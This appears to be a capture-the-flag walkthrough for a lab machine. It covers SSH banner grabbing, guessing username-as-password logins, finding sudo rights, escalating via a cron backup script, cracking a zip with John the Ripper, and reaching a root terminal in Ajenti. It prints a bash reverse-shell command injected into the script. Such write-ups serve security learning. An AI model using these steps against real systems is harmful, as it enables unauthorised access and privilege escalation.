This one's a little messed up. There are 2 flags here user and root.

Doing a nmap scan we see there are 3 ports http/80, http/8000, ssh/22.

Now we can try to scan http/80 for something but that will give us nothing. It is on big rabbit hole. But http/8000 is ajenti login portal.

There is no way of enumerating users and passwords here so we have to exploit this using ssh port.

This requires something called banner grabbing. For that we can just try and login as any user. 

__ssh target_ip__ --> Here in the banner we see username format for different users.

```
Hi !!! THIS MESSAGE IS ONLY VISIBLE IN OUR NETWORK :) 

   ___      _        ___                    
  / __|__ _(_)_ _   | _ \_____ __ _____ _ _ 
 | (_ / _` | | ' \  |  _/ _ \ V  V / -_) '_|
  \___\__,_|_|_||_| |_| \___/\_/\_/\___|_|  
                                            

I HOPE EVERYONE KNOW THE JOINING ID CAUSE THAT IS YOUR USERNAME : ie : employee1 employee2 ... ... ... so on ;)

I already told the format of password of everyone in the yesterday's metting.

Now i have configured everything. My request is to everyone to Complete assignments on time 

btw one of my employee have sudo powers because he is my favourite 

NOTE : "This message will automatically removed after 2 days" 
                                                                - BOSS
```        
We try logging using employee1:employee1. And we're in. So probably all users have username as their password.

Also the line _one of my employee have sudo powers because he is my favourite_ is interesting.

We can write a script to login as employees and run the command __sudo -l__ and scout the output.

After running the script for sometime we get that employee64 can run sudo commands as user programmer.

Logging in as him still we can't find anything significant in all his directories. So we download __pspy64__ onto the server and run that to see if there are any cronjobs running in the background. 

We see that there is a script running in the background in programmer dir. So we need to login as him to access it to change it.

__sudo -u programmer /usr/bin/unshare__ --> Now we are logged as programmer so we can change the script running in the background.

```
2020/12/17 10:12:02 CMD: UID=1183 PID=3796   | /bin/bash /media/programmer/scripts/backup.sh 
```
We see that this script runs as UID=1183 which is not the UID of programmer. We can find out who it is by running a simple command.

__cat /etc/passwd | grep -e "UID=1183"__

We see that user 1183 is vanshal. so we can get a shell as vanshal if we add a bash reverse shell script to the backup.sh file and listen on another port.

__bash -i >& /dev/tcp/host_ip/port 0>&1__ --> added in backup.sh

Note: we can't use nano because it's not on this machine we have to use vim editor.

___After we get a shell we got the FIRST FLAG in local.txt.___

We can run python2 on this so let's start a http server and download the secret.zip file onto our system.

__python -m SimpleHTTPServer 4445__ --> Port number can be anything that's not already in use by the system.

After downloading the file we can [crack the password using john the ripper](https://dfir.science/2014/07/how-to-cracking-zip-and-rar-protected.html).

We find that __password to zip file is 81237900__. Opening that we get a very secure password in Mypassword.txt file.

This might be the password for that ajenti login running on port 8000. And yes, it is.

__root: contents of Mypasswords.txt__

Now here on the website we see a tab saying terminal. Going to it we see we have a root terminal shell.

___We can change into the root directory and read the PROOF.TXT which is the ROOT FLAG.___

And That's it.